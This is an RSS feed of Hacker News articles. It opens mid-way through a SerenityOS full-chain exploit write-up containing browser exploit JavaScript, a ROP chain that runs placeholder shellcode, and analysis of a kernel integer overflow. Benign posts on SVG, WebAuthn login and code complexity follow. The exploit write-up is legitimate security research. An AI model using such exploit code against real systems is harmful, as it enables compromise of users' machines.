      <span>log</span><span>(</span><span>"</span><span>found stack_ret 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>());</span>
      <span>stack_ret</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>0x12345678</span><span>);</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>Loading the above in the browser resulting in a crash at <code>0x12345678</code>:</p>

<div><div><pre><code>[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: Unrecoverable page fault, instruction fetch / read from address V0x12345678
[Browser(37:37)]: CRASH: CPU #0 Page Fault. Ring 3.
[Browser(37:37)]: exception code: 0014 (isr: 0000
[Browser(37:37)]:   pc=001b:12345678 flags=0246
[Browser(37:37)]:  stk=0023:026ff2e4
[Browser(37:37)]:   ds=0023 es=0023 fs=0023 gs=002b
[Browser(37:37)]: eax=026ff3c0 ebx=0491ce8c ecx=00000000 edx=0491e4a0
[Browser(37:37)]: ebp=026ff378 esp=c2a48fe8 esi=00000005 edi=02d0dfd8
[Browser(37:37)]: cr0=80010013 cr2=12345678 cr3=07351000 cr4=003006e4
[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: 0x12345678  (?)
</code></pre></div></div>

<p>Since we can write any amount to the stack, it was fairly straight forward to build a rop chain that mmapped a region, put some shellcode there, mprotected it to make it executable, then jump there:</p>

<div><div><pre><code><span>const</span> <span>libc_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x122000</span><span>;</span>
<span>const</span> <span>mmap_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b379</span><span>;</span>
<span>const</span> <span>memcpy_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x002f51d</span><span>;</span>
<span>const</span> <span>mprotect_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b487</span><span>;</span>

<span>const</span> <span>shellcode</span> <span>=</span> <span>[</span><span>0xcccccccc</span><span>];</span>

<span>// write our shellcode to a know location (start of the stack)</span>
<span>const</span> <span>shellcode_addr</span> <span>=</span> <span>stack_addr</span><span>;</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>shellcode</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>shellcode_addr</span> <span>+</span> <span>i</span> <span>*</span> <span>4</span><span>,</span> <span>shellcode</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>log</span><span>(</span><span>"</span><span>shellcode_addr: 0x</span><span>"</span> <span>+</span> <span>shellcode_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// rop gadgets</span>
<span>// 0x000462f3: pop esi; pop edi; pop ebp; ret;</span>
<span>// 0x0007bda9: add esp, 0x10; pop esi; pop edi; pop ebp; ret;</span>

<span>pop7_addr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x0007bda9</span><span>;</span>
<span>pop3_adr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x000462f3</span><span>;</span>

<span>log</span><span>(</span><span>"</span><span>pop7_addr: 0x</span><span>"</span> <span>+</span> <span>pop7_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
<span>log</span><span>(</span><span>"</span><span>pop3_adr: 0x</span><span>"</span> <span>+</span> <span>pop3_adr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// 1. map region at 0x9d000000</span>
<span>// 2. memcpy our shellcode there</span>
<span>// 3. make it executable</span>
<span>// 4. jump there</span>
<span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>mmap_addr</span><span>);</span>
<span>const</span> <span>rop</span> <span>=</span> <span>[</span>
  <span>pop7_addr</span><span>,</span> <span>//ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>3</span><span>,</span>
  <span>0x32</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0xdeadbeef</span><span>,</span>

  <span>memcpy_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>shellcode_addr</span><span>,</span>
  <span>0x8000</span><span>,</span>

  <span>mprotect_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>5</span><span>,</span>

  <span>0x9d000000</span><span>,</span>
<span>];</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>rop</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>stack_ret</span> <span>+</span> <span>4</span> <span>*</span> <span>(</span><span>2</span> <span>+</span> <span>i</span><span>),</span> <span>rop</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>// finish to trigger the rop chain</span>
</code></pre></div></div>

<p>After loading this up and setting a breakpoint with gdb at <code>0x9d000000</code>:</p>

<p><img src="https://devcraft.io/assets/serenity/gef.jpg" alt="gef"></p>

<p>Success! Arbitrary code in the browser.</p>

<h3 id="kernel-bug-hunting">Kernel Bug Hunting</h3>

<p>Next it was time to try and find a kernel bug that could be reached from the browser process. There had been a few issues with integer overflows, so I started looking for places that this might happen. After some searching I saw the following in <a href="https://github.com/SerenityOS/serenity/blob/22b0ff05d4a5b087d805d8147ca12efe410cb18f/Kernel/VM/RangeAllocator.cpp#L139">RangeAllocator::allocate_anywhere</a>:</p>

<div><div><pre><code><span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>m_available_ranges</span><span>.</span><span>size</span><span>();</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
    <span>auto</span><span>&amp;</span> <span>available_range</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>i</span><span>];</span>

    <span>// FIXME: This check is probably excluding some valid candidates when using a large alignment.</span>
    <span>if</span> <span>(</span><span>available_range</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>effective_size</span> <span>+</span> <span>alignment</span><span>))</span>
        <span>continue</span><span>;</span>
</code></pre></div></div>

<p>Each process has a list of available ranges that are used when allocating memory regions. This code is looping through all the ranges and seeing if there is one large enough to hold the requested size, taking into account the alignment (both <code>effective_size</code> and <code>alignment</code> are controlled by the user). The issue is that <code>effective_size + alignment</code> can overflow, resulting in a range being chosen that is too small to hold the requested size.</p>

<p>The <code>available_range</code> is then used to create a new allocated range:</p>

<div><div><pre><code>    <span>FlatPtr</span> <span>initial_base</span> <span>=</span> <span>available_range</span><span>.</span><span>base</span><span>().</span><span>offset</span><span>(</span><span>offset_from_effective_base</span><span>).</span><span>get</span><span>();</span>
    <span>FlatPtr</span> <span>aligned_base</span> <span>=</span> <span>round_up_to_power_of_two</span><span>(</span><span>initial_base</span><span>,</span> <span>alignment</span><span>);</span>

    <span>Range</span> <span>allocated_range</span><span>(</span><span>VirtualAddress</span><span>(</span><span>aligned_base</span><span>),</span> <span>size</span><span>);</span>
    <span>if</span> <span>(</span><span>available_range</span> <span>==</span> <span>allocated_range</span><span>)</span> <span>{</span>
        <span>dbgln</span><span>&lt;</span><span>VRA_DEBUG</span><span>&gt;</span><span>(</span><span>"VRA: Allocated perfect-fit anywhere({}, {}): {}"</span><span>,</span> <span>size</span><span>,</span> <span>alignment</span><span>,</span> <span>allocated_range</span><span>.</span><span>base</span><span>().</span><span>get</span><span>());</span>
        <span>m_available_ranges</span><span>.</span><span>remove</span><span>(</span><span>i</span><span>);</span>
        <span>return</span> <span>allocated_range</span><span>;</span>
    <span>}</span>
    <span>carve_at_index</span><span>(</span><span>i</span><span>,</span> <span>allocated_range</span><span>);</span>

    <span>return</span> <span>allocated_range</span><span>;</span>
</code></pre></div></div>

<p>If it isn’t exactly equal then it carves out the range and add the remaining range back into <code>m_available_ranges</code>:</p>

<div><div><pre><code><span>void</span> <span>RangeAllocator</span><span>::</span><span>carve_at_index</span><span>(</span><span>int</span> <span>index</span><span>,</span> <span>const</span> <span>Range</span><span>&amp;</span> <span>range</span><span>)</span>
<span>{</span>
    <span>ASSERT</span><span>(</span><span>m_lock</span><span>.</span><span>is_locked</span><span>());</span>
    <span>auto</span> <span>remaining_parts</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>index</span><span>].</span><span>carve</span><span>(</span><span>range</span><span>);</span>
    <span>ASSERT</span><span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>&gt;=</span> <span>1</span><span>);</span>
    <span>m_available_ranges</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>remaining_parts</span><span>[</span><span>0</span><span>];</span>
    <span>if</span> <span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>==</span> <span>2</span><span>)</span>
        <span>m_available_ranges</span><span>.</span><span>insert</span><span>(</span><span>index</span> <span>+</span> <span>1</span><span>,</span> <span>move</span><span>(</span><span>remaining_parts</span><span>[</span><span>1</span><span>]));</span>
<span>}</span>

<span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>Range</span><span>::</span><span>carve</span><span>(</span><span>const</span> <span>Range</span><span>&amp;</span> <span>taken</span><span>)</span>
<span>{</span>
    <span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>parts</span><span>;</span>
    <span>if</span> <span>(</span><span>taken</span> <span>==</span> <span>*</span><span>this</span><span>)</span>
        <span>return</span> <span>{};</span>
    <span>if</span> <span>(</span><span>taken</span><span>.</span><span>base</span><span>()</span> <span>&gt;</span> <span>base</span><span>())</span>
        <span>parts</span><span>.</span><span>append</span><span>({</span> <span>base</span><span>(),</span> <span>taken</span><span>.</span><span>base</span>…</code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115141</guid>
            <pubDate>Fri, 12 Feb 2021 16:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG: The Good, the Bad and the Ugly]]>
            </title>
            <description>
<![CDATA[
Score 214 | Comments 207 (<a href="https://news.ycombinator.com/item?id=26114863">thread link</a>) | @davebloggt
<br/>
February 12, 2021 | https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        SVG, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/svg-logo.svg" alt=""><figcaption>The SVG logo.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.</p>
<p>I’ve been using SVG together with Inkscape regularly for a few years for sketches and graphics, and like to write it by hand to satisfy my love for precision and art through code. SVG and I have a kind of love-hate relationship. It’s powerful and has some nice free and open-source tooling, but the format itself is pretty ugly.</p>
<h2 id="the-good">The Good</h2>
<ul>
<li><p>It’s <em>the</em> format for vector graphics. It is well supported by a range of programs from Adobe Illustrator to Inkscape for editing and in various browsers.</p></li>
<li><p>It’s a web standard so you can use it directly in websites. You can also use CSS with it.</p></li>
<li><p>It’s XML-based, so the syntax is familiar, it’s extensible and can benefit from the vast XML ecosystem. For example, using <a href="https://en.wikipedia.org/wiki/XLink">XLink</a> you can reference other elements and definitions in an SVG file. Or <a href="https://inkscape.org/">Inkscape</a> uses custom XML tags to extend SVG into their editor exchange format.</p></li>
<li><p>It’s powerful. You can do <em>a lot</em> with it. It obviously supports various path types and shapes, supports text and more, but also animations, gradients, effects and more.</p></li>
</ul>
<h2 id="the-bad">The Bad</h2>
<p>It’s a web standard. And as is customary for a web standard, SVG is magnificiently bloated. The <a href="https://www.w3.org/TR/SVG11/REC-SVG11-20110816.pdf">SVG specification</a> brings a whopping 826 (<em>eight-hundred twenty-six</em>) pages to the table. And as if that’s not enough, it’s also XML-based and cross-linked with other web standards, driving the scope of any implementation to dizzying heights.</p>
<p>If you want to be sure to correctly render all SVG files, not only do you have to consider 800 pages of SVG spec, but e.g.&nbsp;another 20 pages of <a href="https://www.w3.org/TR/xlink11/">XLink spec</a>. Oh, and CSS as well, by the way. And, I shit you not, <em>JAVASCRIPT</em>. Yes. <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script">SVG files can include <code>&lt;script&gt;</code> tags.</a></p>
<p>SVG fits right in with web browsers. They’re hilariously bloated already, they already implement stuff like CSS and JavaScript that a complete SVG implementation requires. This problem of SVG is actually just the <a href="https://drewdevault.com/2020/03/18/Reckless-limitless-scope.html">problem of the web in general</a>. It’s scope is huge, it’s bloated and hard to work with.</p>
<p>SVG is nothing you could implement in a day. Or a week. Or a month. The huge amount of specifications, that are most often only partly implemented, makes it very hard to overview what supports what, confusing the user as to what features they can actually use if they want their SVG file to be universally supported.</p>
<p>Furthermore the XML-based syntax is pretty ugly and needlessly verbose. It’s tiring to write by hand and just as tiring to parse or generate automatically.</p>
<h2 id="the-ugly">The Ugly</h2>
<p>A central problem that can be extracted from the points listed above is the one I detailed in my article about <a href="https://www.eisfunke.com/article/language-design-machine-or-human.html">language design for machines vs.&nbsp;humans</a>: SVG doesn’t know what it wants to be, a machine-focused language or a human-focused language and ends up doing badly in both aspects.</p>
<p>Is it a machine-processible language? It’s far too bloated for that. Writing parsers, renderers and generators for SVGs is a huge task. The syntax is repetitive and complex. It has a lot of features that could be represented by more basic features.</p>
<p>But is it a format well-suited for direct usage by humans? Well, no. Firstly, the exhausting syntax and complexity is also bad for human users. Secondly, it misses a lot of features that would make it suitable for direct use. A graphics language that is meant for direct human use would be <a href="http://texdoc.net/pkg/tikz">Ti<em>k</em>Z</a> for LaTeX. While it’s not a great language regarding user experience in my opinion, it is definitely meant for humans and has the necessary features to help making creating complex graphics easy. But nobody would have the idea to use Ti<em>k</em>Z code as an interchange format for the finished graphic. Nobody would want to implement 1300 pages of Ti<em>k</em>Z manual just to view some graphic. Instead you compile it into an PDF (which is also a horrible format and badly bloated, but well). If SVG was a language meant for human use, compiling it into a machine-focused format would be the way to go as well, but as I said – it isn’t. It’s neither.</p>
<h2 id="what-now">What now?</h2>
<p>A good idea would be to develop a simple vector graphics exchange format that is desigend to be easily processed by machines. As minimal in features as possible. Maybe JSON-based, definitely not XML-based. You should be able to implement a basic renderer in a few days, or even better, hours, without depending on two metric tons of XML ecosystem libraries. Bezier curves, elliptic curves, fills, outlines and gradients should mostly suffice to represent every unanimated SVG. An extension could allow animations in a separate file extension.</p>
<p>This minimal and well-delimited format could then have a strict test suite and be implemented in browsers and image viewers with relative ease. Users could rely on their graphic working everywhere and implementers wouldn’t have to worry about implementing XLink, CSS and JavaScript as well. It could save bandwidth and computation power. Compilers from and to SVG could be written for compatibility.</p>
<p>It could be used as export format of user-facing programs like Inkscape or Adobe Illustrator. For people wanting to markup graphics through code there’s already stuff like Ti<em>k</em>Z, <a href="https://diagrams.github.io/">Haskell diagrams</a> or <a href="https://matplotlib.org/stable/index.html">Python matplotlib</a> that could also export to the new minimal interchange format.</p>
<p>I’m actually thinking about making a slim machine-focused vector graphics format (the name <em>“SlimSVG”</em> has been suggested :D) and writing my own human-focused Haskell graphics creation library with similar goals for my own purposes in the future, maybe as a student research project for the university.</p>
<p>In summary: Decide whether a language is for humans or for machines and do one of those things. And do the one thing well instead of both, but badly.</p>
<hr>
<p><strong>Update 1:</strong> This article was posted on <a href="https://news.ycombinator.com/item?id=26114863">Hacker News</a> and landed on the front page, currently it’s on rank 3. I’m honored! <a href="https://news.ycombinator.com/reply?id=26115086&amp;goto=item%3Fid%3D26114863%2326115086">In the comments there</a> somebody mentioned an <a href="https://www.xul.fr/svgtetris.svg">interesting use of the <code>&lt;script&gt;</code> tag in SVG</a>. I’m unsure though whether I should be impressed or horrified :D</p>
<p><strong>Update 2:</strong> Somebody posted this on <a href="https://www.reddit.com/r/programming/comments/livw57/svg_the_good_the_bad_and_the_ugly">Reddit</a> as well. Currently, there are over 150 comments, wow.</p>
<p><strong>Update 3:</strong> PEOPLE, PLEASE. This is absolutely not about “XML is bad, let’s do JSON instead”. I actually like XML more than JSON in total, I’m a fan of XML schema and nice strong schemas. And while I still don’t like the syntax, XML generally is a good fit for a document markup language like HTML. I mostly wouldn’t care whether a good format with a good data model was encoded in JSON, XML, YAML, binary, Brainfuck or monkey feces. The encoding really is the least important part. I just think that for a strictly machine-focused format for data JSON would be a better choice.</p>
<p>I guess though I should have anticipated that saying that I don’t like XML and then mentioning the word “JSON” would start a religious war.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p><a href="https://commons.wikimedia.org/wiki/File:SVG_logo.svg">Image source</a>, licensed under CC-BY-SA-4.0<a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
                <!-- /Body -->
            </div></div>]]>
            </description>
            <link>https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114863</guid>
            <pubDate>Fri, 12 Feb 2021 15:43:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effortless Security on the Web]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114546">thread link</a>) | @mooreds
<br/>
February 12, 2021 | https://engineering.q42.nl/passwordless-authentication/ | <a href="https://web.archive.org/web/*/https://engineering.q42.nl/passwordless-authentication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Wouldn’t it be amazing if you could sign up with a website with face recognition on your mobile phone and the next day on your MacBook you could just use your fingerprint scanner to sign in? What if we told you that this is possible today? </p><p>Currently you manage your accounts using passwords that you have to remember. For most users this is done by either remembering various different passwords, or worse; using the same one for every website. While social login has brought us a convenient way to sign in to websites using a single account, it still requires an account with a password. On top of that, there are security and privacy risks when using a single account for each service. Extra layers of security, like two factor authentication, can be added. But those come at the cost of complexity for the end user. The problem lies in passwords themselves. To solve it we should, and finally can, get rid of them all together to provide a user-friendly and secure authentication flow. </p><p>Even though it is still early and it has not landed in all browsers, we feel this is the future. We have already looked into what it takes to implement. As with any form of authentication, it is definitely not a trivial subject and it requires effort to implement. But please bear with us though, as we talk you through the steps. The result for the end user is definitely worth it.</p><p>Passwordless authentication on the web is made possible by the new Web Authentication (WebAuthn) API. If you’re not familiar with this API, you can check out <a href="https://webauthn.guide/#about-webauthn">this guide</a> or the video below to make it all a bit more tangible.</p><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/hk7kDRx3MuQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The simplicity of using WebAuthn</figcaption></figure><h3 id="connecting-devices">Connecting devices</h3><p>The WebAuthn API supports replacing passwords with biometric data through device specific authenticators. These authenticators are, for example, the facial recognition &amp; fingerprint scanners built into (mobile) devices.</p><p>Creating accounts and logging in with a device-specific authenticator has one problem. The fingerprint scanner on a mobile phone isn’t connected to the one on a laptop. So, how does a user access their account on a laptop if they created the account on a mobile phone? </p><p>For multi-device passwordless authentication we created a proof-of-concept flow. Our solution uses a secure environment already shared on all devices: email. A secure link sent through email connects the laptop &amp; mobile phone. No typing required at all. Let’s explore this flow together.</p><h3 id="under-the-hood">Under the hood</h3><p>For most server side languages, there’s a library available that does the heavy lifting around WebAuthn by implementing FIDO2. We went with <a href="https://github.com/abergs/fido2-net-lib">abergs/fido2-net-lib</a> on .NET core. The juicy part is in expanding the user interaction flow. Let’s start with registration. </p><p>A user enters a desired username (a valid email in our case), presses the register button and is presented with a biometric confirmation modal to resolve a generated challenge that is sent by the server. When the user successfully authenticates with their biometric info, an account is created for that user.</p><p>During account creation, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device creates public + private key</li><li>Device sends public key as response</li><li>Server creates user account associated to that public key</li></ol><p>When a user later wants to login to the website, they enter their username (email) again and then are presented with a biometric confirmation modal to resolve a generated challenge. This time the server checks if the response (that the browser generates based on the given challenge and private key) matches the user with the given email address. If that’s the case, the user is logged in.</p><p>During user login, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device signs challenge with private key</li><li>Device sends response to server</li><li>Server verifies response with public key</li></ol><p>On a technical level this is not too different compared to a regular password login, if you would hash and salt the password before sending it over. The biggest difference is we’re not asking the user to authenticate with something that needs to be remembered.</p><h3 id="implementing-multi-device-sign-in">Implementing multi-device sign-in</h3><p>Logging in with a platform authenticator only works if the local device has credentials stored for this website. The first step in making multi-device possible is by detecting if the device has credentials for the current website user account or not. If it doesn’t, the Web Authentication API will throw an error. This allows us to ask the user if they want to add this device to their account.</p><figure><pre><code>let credentials;
try {
  credentials = await navigator.credentials.get(optionsObject);
} catch (err) {
  // Show modal to ask if the user wants to add this device to their account
  confirmAddDevice();
}</code></pre><figcaption>Detect if the device platform authenticator has known credentials</figcaption></figure><p>This is the hook that allows us to extend the user experience. For our take on a possible UX flow for passwordless multi-device authentication we came up with the diagram below. Highlighted in blue is the email confirmation flow that we found missing in existing implementations of logging in without a password. Remember that, while this diagram may seem daunting at first, all the parts in black are taken care of by WebAuthn and the FIDO2 library. Luckily that also is the hardest and most boring part.</p><figure><img src="https://lh3.googleusercontent.com/vwtyGrDkcChPhUrxucOV-6IbyzezykWKK-NI_KEF4px3Ke-uGunrfKZXd34gd0z5R0tfd1-xEiidbgTCVbKK09qdhKiW6ezDYaUg_keR61DoGJmJR1Xs4vXokVCnSzWAD2fSwFFG"><figcaption>Expand the platform authenticator flow to support multiple devices</figcaption></figure><p>Our flow starts when the user wants to sign in to their existing account from an unknown device. The flow starts similar to the regular login flow. However, we can now detect when the device has no credentials stored for this website.</p><p>Interaction wise this is where things get interesting. We can let the user know that this is an unknown account that is being attempted to sign in to. But just showing an error is a dead path. A user expects an immediate follow-up action to add this device to the account.</p><p>In our case we show a modal to ask the user if they want to add the new device:</p><figure><pre><code>async function confirmAddDevice() {
  const confirm = confirm('Do you want to add this device to your account?');
  if (!confirm) {
    // User denied the confirm modal, do nothing
    return;
  }

  try {
    await fetch('/api/add-device', {
      method: 'POST',
      body: {
        email: this.email
      }
    });

    alert('Email sent, click the link in the mail to continue the process.')
  } catch {
    alert('Could not send an email, please try again later.')
  }
}</code></pre><figcaption>Ask the user if they want to add the device to their account</figcaption></figure><p>When the user confirms the action, the client sends a request to the server. Luckily we know how to securely contact the user because they registered with their email as username. The server then sends an email that allows the user to register their device.</p><figure><pre><code>[HttpPost]
[Route("/add-device")]
public async Task&lt;JsonResult&gt; AddDevice([FromBody] string email)
{
  var user = Storage.GetUser(email);
  if(user == null) {
    return NotFound();
  }

  var otp = Storage.GenerateAndStoreOneTimePasswordForUser(user);

  var response = await SendAddDeviceEmail(user, otp);
  return Json(response);
}</code></pre><figcaption>Send an email to the user</figcaption></figure><p>By clicking the link in the email, the user confirms this device may be added to their account. The flow is just like with the first device, only adding a one time password (OTP) in the form of a link in an email. The OTP allows the new device to be securely linked to the existing account. This is done by the server, which checks if the OTP matches the one generated for the user, and stores the challenge response as an additional device linked to the account.</p><p>This way, minimal user input is required to allow multi-device passwordless authentication on the web. On top of that, we leverage existing patterns for account validation (through email) that users are already used to on the web.</p><h3 id="outro">Outro</h3><p>We are very excited to work towards a more secure and effortless web, and can’t wait to use this in production. What’s your opinion on passwordless authentication, and how should multi-device usage be addressed? We would love to hear your ideas and get to know your implementations.</p><hr><p><em>Do you love figuring out new features like multi-device passwordless authentication? Then please do check our job vacancies (in Dutch) at <a href="https://werkenbij.q42.nl/">https://werkenbij.q42.nl</a>!</em></p>
                </div>
            </section></div>]]>
            </description>
            <link>https://engineering.q42.nl/passwordless-authentication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114546</guid>
            <pubDate>Fri, 12 Feb 2021 15:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For the Love of All That's Holy, Use CCL to Control Complexity in Your Systems]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26114364">thread link</a>) | @brobdingnagians
<br/>
February 12, 2021 | https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>&lt;rant&gt;Two years ago I sat in on a security meeting. The subject was protecting the code and associated websites from attack.</p><p>"I'd just attack the npm packaging system, introducing subtle changes in several that would work together to do whatever I wanted."</p><p>All I got was blank stares, and this was from professionals. From <a href="https://www.bleepingcomputer.com/news/security/researcher-hacks-over-35-tech-firms-in-novel-supply-chain-attack">this week's reading</a>:</p><blockquote>Unlike <a href="https://www.bleepingcomputer.com/news/security/malicious-npm-project-steals-discord-accounts-browser-info/">traditional typosquatting attacks</a> that rely on social engineering tactics or the victim misspelling a package name, this particular supply chain attack is more sophisticated as it needed no action by the victim, who automatically received the malicious packages.<p>This is because the attack leveraged a unique design flaw of the open-source ecosystems called <strong>dependency confusion.</strong></p></blockquote><p>Even using things like Test-Driven Development, programmers can only reason about a small part of the code in front of him in the IDE. (In fact, one of the reasons TDD is so successful is because programmers have no idea at how much they suck at actually understanding what they're doing).</p><p>From a recent study:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/EsXlJyCXYAAD9x7.png 600w, https://danielbmarkham.com/content/images/size/w1000/2021/02/EsXlJyCXYAAD9x7.png 1000w, https://danielbmarkham.com/content/images/size/w1600/2021/02/EsXlJyCXYAAD9x7.png 1600w, https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png 1890w" sizes="(min-width: 720px) 720px"></figure><p>Here's the takeaway graphic:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/2021-02-11_9-41-46.jpg 600w, https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg 678w"></figure><p>Note: this result is seeking out a mean, regular coders writing regular code. Your mileage may vary.</p><p>Why is this? Let's take two code samples:</p><!--kg-card-begin: markdown--><pre><code>echo Hello World
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>#include &lt;cstdio&gt;

int main()
{
    printf("hello from %s!\n", "HelloWorld");
    return 0;
}
</code></pre>
<!--kg-card-end: markdown--><p>In the first example, how many symbols is the programmer manipulating to reach their goal? Only one, "echo" In the second example, how many symbols are being manipulated?</p><p>I counted seven, but I wasn't trying to be strict.</p><p>What do these seven involve? There's namespaces, libraries, standard function signatures, string substitution, OS return values, and so on.</p><p>Do any of these matter to the new C# programmer? Of course not! That's why it's called "Hello World". You're supposed to be able to type in a few symbols and start doing something useful right away.</p><p>The waters get murky very quickly after that. Let's say your boss sends you an email:</p><p>"Jenkins, add the cover sheet to all of those TPS reports"</p><p>Something goes wrong. The boss is unhappy. You two have a conversation about what you did that was mistaken.</p><p>Suppose instead you're looking at the following code:</p><!--kg-card-begin: markdown--><pre><code>WorkingStack.Reports.AddSheet(cover);
</code></pre>
<!--kg-card-end: markdown--><p>The boss is mad because it's not working right.</p><p>You can certainly go into the boss's office and have that same conversation, just this time over code instead of an email. <em>In fact, that's what you have to do</em>. Without a bunch more source code, what the hell does that C# code do, anyway? You don't know. It says it does the same thing as the boss wanted, but for all you know it's mailing off your tax returns to Russian hackers.</p><p>Most of modern programming is spent creating and consuming fake abstractions that are much more leaky and buggy than we'd like admit. In fact, it's grown far, far beyond our ability to reason about. It's magic. We spend a lot of time pretending that this isn't the case, then cursing when reality rears its ugly head again.</p><p>When I was writing <a href="https://leanpub.com/info-ops2">my second book</a>, I had to address this problem because reasoning about code and controlling complexity is the number one problem in software development today. It's the reason we have buildings full of hundreds of developers wasting a lot of time and money. Our incentives are wrong.</p><p>The best thing to look for in any professional, doctor, lawyer, coder, etc is their ability to not engage with a problem, instead solving it in a simple and non-intrusive way. The worst behavior from professionals are the folks who are going to do a lot of work no matter what. These guys look busy, and they’re deep in a bunch of technically wonky stuff that nobody understands, so naturally they look like they know what they’re doing and are doing a good job. The guy who 